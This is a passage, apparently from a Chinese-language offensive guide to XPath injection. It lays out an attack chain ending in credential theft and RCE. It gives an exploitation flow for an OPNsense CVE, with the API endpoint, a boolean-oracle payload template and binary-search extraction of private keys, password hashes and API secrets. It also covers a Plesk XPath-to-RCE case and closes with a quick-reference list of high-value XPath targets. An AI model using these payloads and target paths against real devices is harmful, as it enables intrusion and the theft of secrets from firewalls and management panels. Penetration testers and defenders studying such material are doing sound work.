## 十二、信息泄露→敏感数据提取完整攻击链

### 12.1 攻击链总览
```
信息收集(注入点/文档结构指纹)
  → 认证绕过(永真条件)
    → 结构枚举(根节点/节点名/属性)
      → 定位敏感数据(token/密钥/口令哈希/凭据)
        → 盲注高效提取(二分/字符集二分/OAST)
          → 凭据复用/横向 / 写配置节点 / 结合XSLT→RCE
```

### 12.2 实战案例：OPNsense CVE-2026-53582（存储型XPath注入→全配置泄露）
- **漏洞点**：`count(Config::getInstance()->object()->xpath("//*[text()='{$node->refid}']"))`，refid用户可控且无格式校验
- **影响**：仅需CA/证书管理权限，即可泄漏config.xml中WireGuard私钥、root口令哈希、API Key/Secret、OpenVPN密钥（`//system/user/password`、`//system/user/apikeys/item/secret`等XPath目标）
- **利用流程**：
```
1. POST /api/trust/ca/add 写入可控refid（存储型注入点）
2. 用 ca/refid='<payload>' 构造布尔oracle：
   payload = f"{nx}' or ({condition}) or 'x'='"
3. 条件真→refcount>0（通过ca/get接口观测）
4. 二分长度 + contains字符集二分逐字符提取任意XPath节点值
5. 多线程并发加速（参考5.6脚本）
```
- **启示**：防火墙/网关/管理面板的config.xml是XPath注入的高价值靶标；存储型注入点可反复利用形成稳定oracle。

### 12.3 实战案例：Plesk CVE-2026-44962（XPath注入→RCE，CVSS 9.9）
- **漏洞点**：APS Application Catalog搜索功能将用户输入直接拼入XPath查询（CWE-643）
- **影响**：低权限认证用户→任意OS命令执行→本地提权（CVSS 9.9：AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H）
- **启示**：XPath注入不是"只能读XML"——当查询结果/错误被带入后续处理（如XSLT渲染、命令参数）时，可升级为RCE。测试时关注：查询结果是否回显、是否经过模板/转换层、错误信息是否进入日志/命令。

### 12.4 高价值目标XPath速查
```
//system/user/password                 # 口令哈希
//system/user/apikeys/item/secret      # API密钥
//OPNsense/wireguard/server/.../privkey# 私钥
//config/credentials/...               # 通用配置凭据
//*/@*                                 # 全属性（常含id/token）
```

